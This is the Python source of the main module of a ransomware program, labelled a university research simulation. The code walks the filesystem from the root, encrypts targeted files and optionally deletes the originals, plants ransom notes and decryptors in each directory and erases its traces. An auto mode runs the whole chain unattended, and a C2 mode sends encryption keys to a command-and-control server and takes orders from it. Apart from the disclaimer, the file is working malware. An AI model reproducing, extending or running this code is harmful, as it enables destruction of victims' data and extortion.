import os
from crypto import CryptoGraphy
from websocket_client import WebsocketClient
import asyncio
import json

class Program():
    def __init__(self, data = None, mode = "manual", system = "Darwin"):
        self.__mode__ = mode 
        self.__system__ = system
        self.__criptography: CryptoGraphy = None
        self.__directories_with_files = []
        self.__found_files = []
        self.__should_cli_run = True
        self.__id = ""
        self.connected = asyncio.Event()
        self.__client: WebsocketClient = None
        if data is not None:
            self.__found_files = data.get("found_files", [])
            self.__directories_with_files = data.get("directories_with_files", [])
        
    async def start(self):
        print("This is the ransomware main module.")
        print("What would you like to do?")
        match self.__mode__:
            case "auto":
                self.__auto_mode()
            case "manual":
                await self.__cli()
            case "c2":
                await self.__c2_mode()

    async def stop(self):
        match self.__mode__:
            case "c2":
                print("Stopping C2 connection...")
                if self.__client is not None:
                    await self.__client.stop()
            case "auto":
                pass
            case "manual":
                self.__should_cli_run = False

    def __help(self):
        print("Available commands:")
        print("\thelp - show this help message")
        print("\tgreet - print a greeting")
        print("\tinfo - displays information about the ransomware")
        print("\tchangeMode - changes the mode of operation")
        print("\t\tDefault mode is 'manual'")
        print("\t\tAvilable modes: auto, c2, manual")
        print("\tenvcheck - checks the environment in which the program is running")
        print("\tdirectory - discovers the files in the system avoiding specific file types and folders")
        print("\t\tDefault is '/'")
        print("\t\tExample: directory /Users/username/Documents")
        print("\tsetup - sets up the cryptographic configuration")
        print("\t\tOptions: ") 
        print("\t\t\t--encrypt (enables encryption) ")
        print("\t\t\t--delete (deletes files after encryption/decryption)")
        print("\tencrypt - encrypts the discovered files")
        print("\transomnote - displays the ransom note to the user")
        print("\tdecrypt - decrypts the previously encrypted files")
        print("\tdeletetraces - deletes traces of the program")
        print("\ttestfunc - runs the function to be tested")
        print("\texit or quit - quit the program")

    def __info(self):
        print("This code is a ransomware simulation tool made for educational purposes as part of a university research project.")
        print("It is still able to encrypt files in your system, so be cautious when using it, specially in auto mode.\n")
        print("The program is currently running in", self.__mode__, "mode.")
        print("In this mode the program requires user interaction to proceed with its operations.")
        print("In this mode, It does not require for further action to decrypt the files once encrypted.")
        print("This mode requires to force the actions in order to proceeed with things that would usually execute back to back.")
        print("\n")                
        print("If the mode is chanaged to auto, the program will run without user interaction, and system files will be encrypted.")
        print("In auto mode, once the files are encrypted, the decryption will not proceed automatically.")
        print("To decrypt the files, the user will need to follow the steps written in the ransom note.")
        print("\n")
        print("USE AT YOUR OWN RISK!\n")

    async def __change_mode(self, new_mode = "manual"):
        print(f"Mode changed to {new_mode}")
        match new_mode:
            case "auto":
                print("Auto mode selected. The program will run without user interaction.")
                self.__should_cli_run = False
                self.__auto_mode()
            case "c2":
                print("C2 mode selected. The program will attempt to connect to a command and control server.")
                self.__should_cli_run = False
                await self.__c2_mode()
            case "manual":
                print("Manual mode selected. The program will wait for user input.")
                if self.__mode__ != new_mode:
                    await self.__cli()

        self.__mode__ = new_mode

    def set_id(self, id: str):
        self.__id = id
    
    def __envcheck(self):
        import platform

        self.__system__ = platform.system()
        print("System:", self.__system__)        # 'Windows', 'Linux', 'Darwin'
        print("Release:", platform.release())
        print("Version:", platform.version())
        print("Machine:", platform.machine())      # 'x86_64', 'arm64'
        print("Processor:", platform.processor())
        print(platform.platform())




    def __directory(self, start_path="/", skipped_folders=None, targeted_extensions=None):
        import json
        with open("conf.json", "r") as conf_file:
                data = json.load(conf_file)

        if skipped_folders is None:
            general = data.get("skipped_directories_general", [])
            folders = data.get("skipped_directories_" + self.__system__, [])
            skipped_folders = general + folders

        if targeted_extensions is None:
            targeted_extensions = data.get("targeted_extensions", [])

        self.__found_files = []
        self.__directories_with_files = []

        for root, dirs, files in os.walk(start_path):
            print(f"Current directory: {root}")
            dirs[:] = [d for d in dirs if d not in skipped_folders and not d.startswith('.') and not d.endswith('.app')]
            files = [f for f in files if any(f.endswith(ext) for ext in targeted_extensions)]
            for d in dirs:
                 print(f"  [DIR]  {os.path.join(root, d)}")

            if files:
                self.__directories_with_files.append(root)

            for f in files:
                self.__found_files.append(os.path.join(root, f))

        with open("discovered_info.json", "w") as output_file:
            json.dump({
                "found_files": self.__found_files,
                "directories_with_files": self.__directories_with_files,
                "mode": self.__mode__,
                "id": self.__id
            }, output_file, indent=4)

        print(self.__directories_with_files)
        print(f"Total files found: {len(self.__found_files)}")
        print(f"Total directories with targeted files: {len(self.__directories_with_files)}")

    def __setup(self, should_encrypt=False, should_delete_original=False, c2_mode=False):
        self.__criptography = CryptoGraphy(
            should_encrypt=should_encrypt, 
            should_delete_original=should_delete_original,
            c2_mode=c2_mode
            )
        self.__criptography.setup()
        print(f"Encryption: {should_encrypt}, Delete original files: {should_delete_original}")

    def __encrypt(self):
        if self.__criptography is None:
            print("Cryptography not set up. Please run 'setup' first.")
            return False

        print("Encrypting files...")
        for file in self.__found_files:
            self.__criptography.encrypt(file)
        return True

    def __ransomnote(self):
        print("Creating ransom notes and decryptor scripts...")
        # Copy the contents of the ransom note
        with open("ransom_note.txt", "r") as note_file:
            content = note_file.read()

        with open("decrypt.py", "r") as decryptor_file:
            script_content = decryptor_file.read()

        for dir in self.__directories_with_files:
            self.__create_ransomnote_file(dir, content)
            self.__create_decryptor_file(dir, script_content)
            # path = os.path.join(dir, "decryptor.py")
            # if not os.path.exists(path):
            #     os.symlink(os.path.join(cwd, "decrypt.py"), path)

    def __create_ransomnote_file(self, dst_path=".", content=""):
        with open(dst_path + "/@README@.txt", "w") as output_file:
            output_file.write(content)

    def __create_decryptor_file(self, dest=".", script_content=""):
        # Get the execution directory
        cwd = os.getcwd()
        # Get the path where we want to store the decryptor link
        path = os.path.join(dest, "decryptor.py")
        try:
            if not os.path.exists(path):
                os.symlink(os.path.join(cwd, "decrypt.py"), path)
        except OSError:
            # Windows does not support symlinks without admin privileges
            # So we copy the file instead changing the working directory of it

            #os.chdir(r\"{cwd.replace("\\", "/")}\")
        
            content = script_content.replace("#added_line_script", f"cwd = r'{cwd}'")
    
            with open(path, "w") as decryptor_file:
                decryptor_file.write(content)


    def decrypt(self):
        if self.__criptography is None:
            print("Cryptography not set up. Please run 'setup' first.")
            return False

        for file in self.__found_files:
            self.__criptography.decrypt(file + ".ENCRYPTED")
        return True

    def delete_traces(self):
        print("Deleting traces...")
        
        for dir in self.__directories_with_files:
            ransomnote_path = dir + "/@README@.txt"
            decryptor_path = os.path.join(dir, "decryptor.py")
            if os.path.exists(ransomnote_path):
                os.remove(ransomnote_path)

            if os.path.exists(decryptor_path):
                os.remove(decryptor_path)

        if os.path.exists("discovered_info.json"):
            os.remove("discovered_info.json")

        cwd = os.getcwd()
        import sys
        if self.__system__ == "Windows" and cwd in sys.path:
            #current_dir = os.path.dirname(os.path.abspath(__file__))

            sys.path.remove(cwd)
            
    def __test_function(self, path):

        import sys
        print(sys.path)

    async def __cli(self):
        while self.__should_cli_run:
            inp = input("MyCLI> ").strip()
            command = inp.split()[0]

            match command:
                case "help":
                    self.__help()

                case "greet":
                    print("Hello! This is your custom CLI.")

                case "info":
                    self.__info()
                    
                case "changeMode":
                    print(inp.split()[1])
                    if len(inp.split()) > 1 and inp.split()[1] in ["auto", "c2", "manual"]:
                        await self.__change_mode(inp.split()[1])
                    else:
                        print("Mode not available. Available modes: auto, c2, manual")

                case "envcheck":
                    self.__envcheck()

                case "directory":
                    dir = " ".join(inp.split()[1:]) if len(inp.split()) > 1 else "/"
                    self.__directory(dir)

                case "setup":
                    should_encrypt = "--encrypt" in inp.split()
                    should_delete_original = "--delete" in inp.split()
                    self.__setup(should_encrypt=should_encrypt, should_delete_original=should_delete_original)

                case "loadkey": 
                    self.__criptography.load_key()

                case "encrypt":
                    self.__encrypt()

                case "ransomnote":
                    self.__ransomnote()

                case "decrypt":
                    self.decrypt()

                case "deletetraces":
                    self.delete_traces()
                case "testfunc":
                    print("Running test function...")
                    self.__test_function("mock files/decryptor_test.py")

                case "exit" | "quit":
                    print("Exiting...")
                    self.__should_cli_run = False
                    break

                case "":   # empty input
                    pass

                case _:
                    print(f"Unknown command: {command}")

    def __auto_mode(self):
        self.__envcheck()
        self.__directory(start_path="/")
        self.__setup(should_encrypt=True, should_delete_original=True)
        self.__encrypt()
        self.__ransomnote()

    async def __c2_mode(self):
        print("C2 mode is not yet implemented.")
        self.__envcheck()
        self.__client = WebsocketClient(username=self.__system__, 
                        system=self.__system__, 
                        handler=self.__message_handler)
        await self.__client.connect()

    def __message_handler(self, message: dict):
        message_data = message.get("data", {})
        message_reply = {}
        match message.get("type"):
            case "set_id":
                self.set_id(message.get("data", {}).get("id", ""))
                print("ID SET", self.__id)
                self.connected.set()
                return None
            
            case "discovery_req":
                self.__directory(start_path=message_data.get("initial_directory", "/"))
                message_reply["type"] = "discovery_rep"
                message_reply["data"] = {
                    "files_found": len(self.__found_files),
                    "directories": len(self.__directories_with_files)
                }
            case "crypto_req":
                self.__setup(
                    should_encrypt=message_data.get("encrypt", False),
                    should_delete_original=message_data.get("delete", False),
                    c2_mode=True
                )

                message_reply["type"] = "crypto_rep"
                message_reply["data"] = {
                    "key": self.__criptography.key.decode()
                }

            case "encryption_req":
                result = self.__encrypt()
                message_reply["type"] = "encryption_rep"
                message_reply["data"] = {"total_time": 1 if result else -1}
                return message_reply
            
            case "ransomnote_req":
                self.__ransomnote()
                message_reply["type"] = "ransomnote_rep"
                message_reply["data"] = {}
                
            case "decryption_rep":
                should_decrypt = message_data.get("status", False)
                result = False

                if should_decrypt:
                    key = message_data.get("key", None)
                    if self.__criptography is None:
                        self.__setup(
                            should_encrypt=True,
                            should_delete_original=True,
                            c2_mode=True
                        )
                    self.__criptography.set_key(key.encode())
                    result = self.decrypt()

                message_reply["type"] = "decryption_res"
                message_reply["data"] = {"result": result}
                
            case "cleaning_req":
                self.delete_traces()
                message_reply["type"] = "cleaning_rep"
                message_reply["data"] = {}

            case _:
                print(f"Unknown message type from C2 server: {message.get('type')}")
                return None
        return message_reply
        

    async def send_decryption_request(self):
        if self.__client is not None:
            await self.__client.send_decryption_req()

    def load_key(self, key_filename: str = "secret.key"):
        if self.__criptography is None:
            self.__criptography = CryptoGraphy(should_encrypt=True, should_delete_original=True)
        return self.__criptography.load_key(key_filename)

if __name__ == "__main__":
    from dotenv import load_dotenv
    
    load_dotenv()
    mode = os.getenv("MODE", "manual")

    program = Program(mode=mode)
    asyncio.run(program.start()) 